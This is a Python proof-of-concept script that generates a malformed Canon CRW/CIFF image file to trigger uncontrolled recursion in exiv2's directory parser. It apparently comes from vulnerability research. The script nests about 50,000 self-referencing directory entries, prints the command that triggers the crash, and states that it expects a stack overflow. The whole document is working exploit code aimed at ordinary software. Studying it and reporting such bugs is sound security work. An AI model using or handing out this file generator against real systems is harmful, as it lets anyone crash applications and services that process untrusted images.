#!/usr/bin/env python3
"""
PoC generator for VULN-001: Uncontrolled Recursion in CIFF Directory Parsing (exiv2)

Structure analysis (from crwimage_int.cpp):
- readDirectory(pData, size, byteOrder):
    o = getULong(pData + size - 4)          # last 4 bytes = offset to entry table
    count = getUShort(pData + o)             # number of entries
    # entries at pData + o + 2, each 10 bytes
    for i in range(count):
        entry at start = o + 2 + i*10
        tag(2) + size_field(4) + offset_field(4)
        if typeId(tag) == directory:         # tag & 0x3800 in {0x2800, 0x3000}
            if dataLocation(tag) == valueData:  # tag & 0xC000 == 0
                offset_ = offset_field
                size_   = size_field
                # enforce: if offset_ < start: size_ <= start - offset_
                #          if offset_ >= start: offset_ >= start + 10
                readDirectory(pData + offset_, size_, byteOrder)  # RECURSE

Design: all levels share the same base pointer (heap[0]).
  Level L: buffer = heap[0..H-16*L-1], size = H - 16*L
  Entry table = last 16 bytes of buffer:
    [size-16..size-15]: count = 1
    [size-14..size-13]: tag   = 0x2800
    [size-12..size-9]:  size_field = H - 16*(L+1)  (= E_L, the sub-dir size)
    [size-8..size-5]:   offset_field = 0
    [size-4..size-1]:   o_field = H - 16*(L+1)     (= E_L, same value!)
  Sub-directory: heap[0..E_L-1], size = E_L = H - 16*(L+1)

  Leaf (level D): heap[0..3] = [0,0,0,0]
    o = 0, count = 0. No entries.

Total heap size H = 4 + D * 16.
"""

import struct
import os

D = 50000  # recursion depth; each level adds 16 bytes
# With ASAN-instrumented binary, frames are larger (~400-800 bytes each).
# Two frames per level (readDirectory + doRead). ~8 MB stack.
# D=50000 * ~300 bytes/frame_pair ≈ 15 MB >> 8 MB => stack overflow.

H = 4 + D * 16  # heap size
print(f"[*] Building CRW PoC: D={D} levels, heap={H} bytes, file={26+H} bytes")

# --- Build heap ---
heap = bytearray(H)

# Leaf: heap[0..3] = [0,0,0,0] already zero (bytearray default)
# (readDirectory(heap, 4, bo): o=0, count=0 => no entries)

# Entry tables: level L (0 = root, D-1 = deepest)
# E_L = H - (L+1)*16  =  position of entry table in heap  =  sub-dir size
for L in range(D):
    E = H - (L + 1) * 16   # E_L: both the heap offset AND the sub-dir size
    # [E+0..E+1]:   count = 1
    struct.pack_into('<H', heap, E + 0, 1)
    # [E+2..E+3]:   tag = 0x2800 (directory, valueData)
    struct.pack_into('<H', heap, E + 2, 0x2800)
    # [E+4..E+7]:   size_field = E  (sub-dir size = E bytes)
    struct.pack_into('<I', heap, E + 4, E)
    # [E+8..E+11]:  offset_field = 0  (sub-dir starts at heap[0])
    struct.pack_into('<I', heap, E + 8, 0)
    # [E+12..E+15]: o_field = E  (entry table offset within buffer = E)
    struct.pack_into('<I', heap, E + 12, E)

# --- Build CRW header (26 bytes) ---
HEAP_OFFSET = 26
header = bytearray()
header += b'II'                            # little-endian byte order marker
header += struct.pack('<I', HEAP_OFFSET)   # offset to heap start = 26
header += b'HEAPCCDR'                      # CIFF signature
header += struct.pack('<H', 1)             # major version = 1
header += struct.pack('<H', 2)             # minor version = 2
header += b'\x00' * 8                      # 8 bytes padding

assert len(header) == HEAP_OFFSET

# --- Write file ---
out_dir = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, 'vuln_001_input.crw')
with open(out_path, 'wb') as f:
    f.write(header)
    f.write(heap)

print(f"[+] Written: {out_path} ({len(header) + len(heap)} bytes)")
print(f"[*] Trigger: exiv2 pr vuln_001_input.crw")
print(f"[*] Expected: SIGSEGV / stack-buffer-overflow from recursion depth ~{D}")
